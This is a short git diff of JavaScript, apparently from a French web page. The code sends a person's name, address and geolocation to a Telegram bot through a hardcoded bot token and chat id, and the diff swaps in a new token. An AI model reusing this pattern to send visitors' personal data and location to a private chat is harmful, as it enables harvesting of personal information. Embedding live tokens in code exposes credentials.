@@ -51,7 +51,7 @@
             document.getElementById("status").innerHTML = "Envoi des données à Telegram...";
 
             const message = `Nom: ${nom}\nPrénom: ${prenom}\nAdresse: ${adresse}\nLocalisation: ${userLat}, ${userLon}`;
-            const token = "79228880454:AAEeFEqeWZLra_dZHAdtM9Zwezvw_50cN4"; // Token corrigé
+            const token = "723083643:AAFYpux1yT2FMct7Ksa_j0N8Ac2LCpGNY"; // Nouveau token
             const chat_id = "5646060786";
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
 
